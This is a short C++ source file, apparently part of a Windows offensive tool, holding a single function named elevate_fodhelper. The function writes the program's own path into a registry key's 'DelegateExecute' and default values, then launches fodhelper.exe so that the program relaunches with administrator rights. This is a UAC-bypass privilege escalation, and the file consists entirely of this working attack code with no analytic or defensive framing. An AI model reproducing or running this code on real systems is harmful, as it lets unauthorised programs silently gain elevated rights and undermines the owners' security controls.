#include "privesc.hpp"
#include <windows.h>

bool elevate_fodhelper()
{
    char *path = get_myh_path();
    create_key(path_reg);
    set_value(path_reg, "DelegateExecute", path);
    set_value(path_reg, NULL, path);
    system("C:/Windows/System32/fodhelper.exe");
    ExitProcess(0);
    return (true);
}